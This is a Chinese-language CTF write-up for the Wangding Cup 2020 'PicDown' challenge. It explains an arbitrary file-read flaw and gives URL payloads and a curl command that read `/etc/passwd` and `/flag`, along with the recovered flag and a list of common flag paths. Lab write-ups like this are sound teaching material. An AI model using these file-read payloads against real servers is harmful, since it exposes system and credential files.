# [网鼎杯 2020 白虎组]PicDown

## 题目概述
题目是一个简单的 Web 应用，页面只有一个表单，提交到 `/page` 接口，参数名为 `url`。题目名称 "PicDown" 暗示可能存在下载功能。

## 信息收集
1. 访问首页，发现表单结构：
```html
<form action="/page" method="get">
  <input type="text" name="url"/>
</form>
```

2. 测试 `file://` 协议无响应，测试 SSRF 也无果

3. 直接使用绝对路径 `/etc/passwd` 测试，成功读取文件内容

## 漏洞分析（漏洞类型、原理、判断过程）
**漏洞类型**：任意文件读取（Local File Inclusion）

**原理**：后端代码直接将用户传入的 `url` 参数作为文件路径读取，未进行任何安全校验。攻击者可以通过传入系统敏感文件路径（如 `/etc/passwd`、`/flag` 等）来读取服务器上的任意文件。

**判断过程**：
- 表单参数名为 `url`，尝试 `file://` 协议失败
- 尝试直接传入本地路径 `/etc/passwd`，成功读取
- 确认存在任意文件读取漏洞

## 利用过程（Payload + Flag）

**Payload**：
```
/page?url=/etc/passwd    # 读取系统用户文件，确认漏洞
/page?url=/flag          # 读取 flag 文件
```

**完整请求**：
```bash
curl -s "http://target/page?url=/flag"
```

**返回结果**：
```
flag{5bc835b5-cafc-4187-a8b5-df476e553dbe}
```

## 复现步骤
1. 访问题目 URL
2. 在表单中输入 `/etc/passwd` 并提交，或直接访问 `/page?url=/etc/passwd`
3. 确认可以读取系统文件
4. 尝试读取 `/flag`，获取 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|-------|
| 任意文件读取 | `/page?url=` 参数 | `/flag` | LFI、敏感文件路径猜测 |

## 知识总结（解题技巧、同类题型套路）
1. **参数名提示**：题目参数名为 `url`，但实际可能接受本地路径
2. **协议测试顺序**：先测试 `file://`、`http://` 等协议，失败后尝试直接路径
3. **常见 flag 位置**：`/flag`、`/flag.txt`、`/home/xxx/flag`、`/var/www/html/flag.php` 等
4. **敏感文件探测**：`/etc/passwd` 是确认文件读取漏洞的经典测试文件
